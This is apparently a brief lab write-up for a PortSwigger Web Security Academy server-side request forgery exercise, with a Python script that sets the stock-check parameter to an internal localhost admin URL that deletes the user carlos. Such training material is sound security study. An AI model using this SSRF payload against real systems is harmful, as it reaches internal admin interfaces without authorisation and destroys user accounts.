# SSRF Basic Portswigger

## 2023-12-30, Joakim Oscarsson

### Problem description
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. 

### Solution

```python

import requests 

url = "https://0af800d704f9d9f681ce572600f40083.web-security-academy.net/product/stock"

params = {"stockApi": "http://localhost/admin/delete?username=carlos"}

response = requests.post(url, data=params)

print(response.text)

```